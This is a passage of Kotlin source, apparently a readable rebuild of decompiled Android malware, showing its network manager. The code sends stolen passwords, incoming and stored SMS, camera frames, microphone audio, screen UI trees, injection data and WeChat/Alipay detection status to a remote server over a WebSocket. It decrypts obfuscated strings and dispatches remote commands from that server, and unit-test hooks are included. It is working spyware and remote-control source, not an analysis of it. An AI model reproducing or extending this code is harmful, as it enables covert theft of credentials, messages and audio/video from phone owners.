            client.send(envelope.toString())
            Log.d(TAG, "Event sent: $type")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send event: $type", e)
        }
    }

    /** JADX: c8 — sendPasswordData$1 */
    fun sendPasswordData(data: JSONObject) {
        sendTypedMessage("password_data", data)
    }

    /** JADX: c5 — sendIncomingSms$1 */
    fun sendIncomingSms(data: JSONObject) {
        sendTypedMessage("incoming_sms", data)
    }

    /** JADX: e1 — uploadSms$1 */
    fun uploadSms(data: JSONObject) {
        sendTypedMessage("sms_upload", data)
    }

    /** JADX: c3 — sendCameraFrame$1 */
    fun sendCameraFrame(base64Image: String, mode: String) {
        val client = dataSyncClient ?: return
        try {
            val frameData = JSONObject().apply {
                put("image", base64Image)
                put("mode", mode)
                put("timestamp", System.currentTimeMillis())
            }
            val envelope = buildEnvelope("camera_frame", frameData)
            client.send(envelope.toString())
            Log.d(TAG, "Camera frame sent: mode=$mode")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send camera frame", e)
        }
    }

    /** JADX: e0 — uploadInjectionData$1 */
    fun uploadInjectionData(data: JSONObject) {
        sendTypedMessage("injection_data", data)
    }

    /** JADX: d0 — sendPermissionsUpdate$1 */
    fun sendPermissionsUpdate(data: JSONObject) {
        sendTypedMessage("permissions_update", data)
    }

    /** JADX: c9 — sendPermissionResponse$1 */
    fun sendPermissionResponse(data: JSONObject) {
        sendTypedMessage("permission_response", data)
    }

    /** JADX: d2 — sendScreenLockStatus$1 */
    fun sendScreenLockStatus(data: JSONObject) {
        sendTypedMessage("screen_lock_status", data)
    }

    /** JADX: c7 — sendOperationLog$1 */
    fun sendOperationLog(data: JSONObject) {
        sendTypedMessage("operation_log", data)
    }

    /** JADX: d4 — sendWechatDetectionStatus$1 */
    fun sendWechatDetectionStatus(data: JSONObject) {
        sendTypedMessage("wechat_detection", data)
    }

    /** JADX: c1 — sendAlipayDetectionStatus$1 */
    fun sendAlipayDetectionStatus(data: JSONObject) {
        sendTypedMessage("alipay_detection", data)
    }

    /** JADX: c2 — sendAutoPasswordDetectionStatus$1 */
    fun sendAutoPasswordDetectionStatus(data: JSONObject) {
        sendTypedMessage("auto_password_detection", data)
    }

    /** JADX: NetworkManager$notifyLocalServiceFullConfig$1 */
    fun notifyLocalServiceFullConfig(data: JSONObject) {
        sendTypedMessage("local_service_config", data)
    }

    /**
     * Send UI tree data via WebSocket.
     * JADX: d3
     */
    fun sendUiData(data: JSONObject) {
        val client = dataSyncClient ?: return
        if (!isConnected) return
        try {
            val envelope = JSONObject().apply {
                put("type", StringUtil.decrypt("PlAuMkQ9Hi9FMiNA"))
                put("sessionId", deviceId)
                put("data", data)
                put("timestamp", System.currentTimeMillis())
            }
            client.send(envelope.toString())
        } catch (e: Exception) {
            Log.e(TAG, "发送UI数据失败", e)
        }
    }

    /**
     * Send microphone audio data via WebSocket.
     * JADX: c6
     */
    @Throws(JSONException::class)
    fun sendMicData(sampleRate: Int, sampleCount: Int, audioBase64: String) {
        if (!isConnected || dataSyncClient == null) return
        val envelope = JSONObject().apply {
            put("type", StringUtil.decrypt("JlASKEIoBCFZNBRYBD5ENw=="))
            put("sessionId", deviceId)
            val audioData = JSONObject().apply {
                put("audio", audioBase64)
                put("sampleRate", sampleRate)
                put("sampleCount", sampleCount)
                put("channelCount", 1)
            }
            put("data", audioData)
        }
        val client = dataSyncClient
            ?: throw NullPointerException("dataSyncClient")
        client.send(envelope.toString())
    }

    // ── Phase 10 stubs ──

    /** Send arbitrary data JSON via socket. Stub for injection activity. */
    fun sendData(data: JSONObject) {
        sendEvent("injection_data", data)
    }

    /** Send password data with source and input method. */
    fun sendPassword(password: String, source: String, inputMethod: String) {
        val payload = JSONObject().apply {
            put("text", password)
            put("source", source)
            put("inputMethod", inputMethod)
        }
        sendPasswordData(payload)
    }

    // =========================================================================
    // Remote command handler — JADX: initialize$1
    // =========================================================================

    /**
     * Parse and dispatch an incoming remote command.
     * JADX: initialize$1 inner class
     */
    fun handleRemoteCommand(json: String) {
        try {
            val command = JSONObject(json)
            val commandName = command.optString("command", "unknown")
            Log.d(TAG, "Received remote command: $commandName")

            // JADX: check for force_register command
            // StringUtil.decrypt("LVYDOUgHHitQODhNFCg=") = "force_register"
            if (commandName == StringUtil.decrypt("LVYDOUgHHitQODhNFCg=")) {
                Log.i(TAG, "📝 收到 force_register 命令，异步重新上报设备信息")
                isRegistered = false
                // ADAPT: In JADX this launches a coroutine to re-register
                return
            }

            // Dispatch to callback
            val cb = commandCallback
            if (cb != null) {
                cb.invoke(command)
            } else {
                Log.w(TAG, "⚠️ commandCallback 未就绪，丢弃 WS 命令: $commandName")
            }
        } catch (e: Exception) {
            Log.w(TAG, "处理命令失败", e)
        }
    }

    // =========================================================================
    // DataSyncClient accessor — JADX: b1
    // =========================================================================

    /**
     * Get the DataSyncClient instance, or null if not initialized.
     * JADX: b1
     */
    fun getDataSyncClient(): DataSyncClient? {
        return dataSyncClient
    }

    // =========================================================================
    // Test support
    // =========================================================================

    /**
     * Inject a test DataSyncClient for unit testing.
     */
    internal fun setTestClient(client: DataSyncClient, deviceId: String) {
        this.dataSyncClient = client
        this.deviceId = deviceId
        this.sessionId = deviceId
    }

    /**
     * Set test connection state flags.
     */
    internal fun setTestConnectionState(connected: Boolean, registered: Boolean) {
        this.isConnected = connected
        this.isRegistered = registered
        this.connectionState = if (connected) ConnectionState.CONNECTED else ConnectionState.DISCONNECTED
    }

    /**
     * Set test context for methods that need it.
     */
    internal fun setTestContext(ctx: Context) {
        this.context = ctx
    }

    /**
     * Set initialized flag for testing.
     */
    internal fun setTestInitialized(initialized: Boolean) {
        this.isInitialized = initialized
        if (initialized) keepAliveStarted = true
    }

    // =========================================================================
    // Private helpers
    // =========================================================================

    /**
     * Build a JSON envelope and send via DataSyncClient.
     * Common pattern shared by all typed send methods.
     */
    private fun sendTypedMessage(type: String, data: JSONObject) {
        val client = dataSyncClient ?: return
        try {
            val envelope = buildEnvelope(type, data)
            client.send(envelope.toString())
            Log.d(TAG, "Message sent: $type")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send $type", e)
        }
    }

    /**
     * Build the standard JSON envelope used by all send methods.
     *
     * Format: `{"type":"<type>","sessionId":"<deviceId>","data":{...},"timestamp":<ms>}`
     */
    private fun buildEnvelope(type: String, data: JSONObject): JSONObject {
        return JSONObject().apply {
            put("type", type)
            put("sessionId", deviceId)
            put("data", data)
            put("timestamp", System.currentTimeMillis())
        }
    }
}
